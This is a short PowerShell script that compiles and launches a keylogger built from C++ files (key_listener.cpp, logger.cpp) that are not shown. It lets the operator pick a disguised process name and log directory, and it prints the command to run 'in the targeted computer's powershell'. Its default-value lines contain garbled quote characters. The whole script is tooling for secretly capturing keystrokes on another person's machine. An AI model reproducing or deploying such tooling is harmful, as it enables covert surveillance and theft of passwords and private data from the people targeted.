$Default_proccess_name = �klaf�
$Default_logger_dir_name = �C:\temp�

$Proccess_name = Read-Host -Prompt "Input desired proccess name [default: '$Default_proccess_name']> "

if ([string]::IsNullOrWhiteSpace($Proccess_name)) {
    $Proccess_name = $Default_proccess_name
}

$Logger_dir_name = Read-Host -Prompt "Input desired directory to save the logger [default: '$Default_logger_dir_name' ]> "
if ([string]::IsNullOrWhiteSpace($Logger_dir_name)) {
    $Logger_dir_name = $Default_logger_dir_name
}

Write-Host ""
Write-Host "Compiling..."
g++ ./main.cpp ./key_listener.cpp ./logger.cpp -std=c++14 -o $Proccess_name
Write-Host "Done!`n"

Write-Host "Compiled and saved exe as " $Proccess_name " in the current directory"
Write-Host "To begin run the next command in the targeted computer's powershell cmd`n"
Write-Host "Command line: Start-Process -FilePath " $Proccess_name $Logger_dir_name " -Wait -NoNewWindow`n"

$run_decision = Read-Host -Prompt "Run now? [Y/n] "
if ([string]::IsNullOrWhiteSpace($run_decision) -OR $run_decision -in 'y', 'Y') {
    Start-Process -FilePath .\$Proccess_name $Logger_dir_name -Wait -NoNewWindow
}

if ($run_decision -eq 'n') {
    Write-Host "`nBye Bye for now"
}